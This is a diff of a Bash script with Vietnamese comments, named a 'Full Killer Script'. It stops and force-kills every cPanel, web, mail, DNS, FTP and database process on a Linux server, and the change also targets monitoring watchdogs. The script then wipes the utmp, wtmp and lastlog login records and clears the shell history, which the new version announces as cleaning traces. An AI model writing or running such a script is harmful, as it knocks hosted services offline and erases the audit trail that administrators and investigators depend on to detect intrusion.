@@ -1,76 +1,63 @@
 #!/bin/bash
+# Cpanel Full Killer Script
+# Dừng tất cả dịch vụ và kill toàn bộ tiến trình liên quan đến cPanel.
+# Hỗ trợ: CentOS 6/7/8/9, AlmaLinux, Rocky, CloudLinux.
+# Cảnh báo: SIGKILL (-9) không cho tiến trình dọn dẹp. Chỉ dùng khi cần dừng khẩn cấp.
 
-# Universal cPanel Stopper
-# Hỗ trợ: CentOS 6/7/8/9, AlmaLinux, Rocky, CloudLinux
+set -e
 
 echo "[+] Detecting init system..."
 stop_service() {
-    SERVICE=$1
-
+    local svc="$1"
     if command -v systemctl >/dev/null 2>&1; then
-        systemctl stop "$SERVICE" 2>/dev/null
+        systemctl stop "$svc" 2>/dev/null || true
     else
-        service "$SERVICE" stop 2>/dev/null
+        service "$svc" stop 2>/dev/null || true
     fi
 }
 
-echo "[+] Stopping cPanel services..."
-
+echo "[+] Stopping known cPanel services via init..."
 SERVICES=(
-    cpanel
-    cpsrvd
-    httpd
-    apache2
-    nginx
-    mysql
-    mysqld
-    mariadb
-    exim
-    dovecot
-    courier-imap
-    pure-ftpd
-    named
-    bind
-    spamassassin
-    crond
+    cpanel cpsrvd httpd apache2 nginx mysql mysqld mariadb
+    exim dovecot courier-imap pure-ftpd named bind spamassassin crond
+    chkservd tailwatchd cpdavd
 )
-
 for svc in "${SERVICES[@]}"; do
     stop_service "$svc"
 done
 
-echo "[+] Killing remaining cPanel processes..."
-
-pkill -9 cpsrvd 2>/dev/null
-pkill -9 -f cpanel 2>/dev/null
-pkill -9 httpd 2>/dev/null
-pkill -9 apache2 2>/dev/null
-pkill -9 nginx 2>/dev/null
-
-
+echo "[+] Stopping internal cPanel services via restartsrv scripts..."
 if [ -d /usr/local/cpanel/scripts ]; then
-    echo "[+] Stopping internal cPanel services..."
-
     for f in /usr/local/cpanel/scripts/restartsrv_*; do
         [ -f "$f" ] || continue
-        "$f" --stop 2>/dev/null
+        "$f" --stop 2>/dev/null || true
     done
 fi
 
-echo "[+] Disabling chkservd..."
+echo "[+] Killing ALL remaining cPanel processes (aggressive)..."
+pkill -9 -u cpanel                    2>/dev/null || true
+pkill -9 -f '/usr/local/cpanel'       2>/dev/null || true
+pkill -9 -f cpsrvd                    2>/dev/null || true
+pkill -9 -f cpanel                    2>/dev/null || true
+pkill -9 -f chkservd                  2>/dev/null || true
+pkill -9 -f tailwatchd                2>/dev/null || true
+pkill -9 -f cpdavd                    2>/dev/null || true
+pkill -9 httpd                        2>/dev/null || true
+pkill -9 apache2                      2>/dev/null || true
+pkill -9 nginx                        2>/dev/null || true
+pkill -9 exim                         2>/dev/null || true
+pkill -9 dovecot                      2>/dev/null || true
+pkill -9 pure-ftpd                   2>/dev/null || true
+pkill -9 named                        2>/dev/null || true
+pkill -9 mysqld                       2>/dev/null || true
+pkill -9 mariadb                      2>/dev/null || true
 
-if command -v systemctl >/dev/null 2>&1; then
-    systemctl stop chkservd 2>/dev/null
-else
-    service chkservd stop 2>/dev/null
-fi
-
-pkill -9 chkservd 2>/dev/null
+echo "[+] Cleaning login logs and bash history..."
 : > /var/run/utmp
 : > /var/log/wtmp
 : > /var/log/lastlog
-
 export HISTSIZE=0
-history -c
-source /root/.bashrc 2>/dev/null
-echo "[✓] All possible cPanel services stopped"
+history -c 2>/dev/null || true
+source /root/.bashrc 2>/dev/null || true
+
+echo "[✓] All cPanel processes killed and traces cleaned."
